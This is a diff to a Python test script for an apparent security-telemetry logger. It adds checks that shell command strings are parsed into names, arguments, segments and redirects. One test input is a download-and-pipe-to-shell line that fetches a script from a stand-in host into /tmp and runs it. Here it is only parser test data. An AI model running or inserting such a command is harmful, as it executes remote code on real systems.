@@ -16,7 +16,9 @@ PROJECT_ROOT = Path(__file__).resolve().parent
 sys.path.insert(0, str(PROJECT_ROOT))
 
 import shared.logger as logger_mod
-from shared.events import CONTRACT_KEYS, MITRE_KEYS, build_event, mitre_of
+from shared.events import (
+    CONTRACT_KEYS, MITRE_KEYS, build_event, command_parameters, mitre_of,
+)
 from shared.logger import log_event
 
 CONTRACT = {
@@ -74,6 +76,26 @@ def main() -> bool:
     # Legacy top-level tags still summarize (backward compatibility).
     ok &= check("mitre_of falls back to legacy top-level tags",
                 mitre_of({"mitre_attack_id": "T1078"}).get("mitre_attack_id") == "T1078")
+
+    # Command parameters are structured (contract: "command arguments"),
+    # not a copy of the action string.
+    simple = command_parameters("ls -la /root")
+    ok &= check("simple command: name + args",
+                simple == {"command": "ls -la /root", "name": "ls", "args": ["-la", "/root"]},
+                simple)
+    quoted = command_parameters('echo "a b"')
+    ok &= check("quoted argument stays one arg", quoted["args"] == ["a b"], quoted)
+    line = command_parameters("cd /tmp && wget http://x/a.sh | sh; chmod +x a.sh", "/tmp/out")
+    ok &= check("line lists every command in order",
+                [(c["name"], c["args"]) for c in line.get("segments", [])] == [
+                    ("cd", ["/tmp"]), ("wget", ["http://x/a.sh"]), ("sh", []),
+                    ("chmod", ["+x", "a.sh"]),
+                ], line)
+    ok &= check("line's first command is name/args", line["name"] == "cd", line)
+    ok &= check("redirect recorded", line["redirect"] == "/tmp/out", line)
+    ok &= check("single command has no segments", "segments" not in simple, simple)
+    ok &= check("unbalanced quotes do not raise",
+                command_parameters('echo "oops')["name"] == "echo")
 
     # log_event writes exactly the contract keys and rejects violations.
     tmp = Path(tempfile.mkdtemp(prefix="telemetry-contract-"))
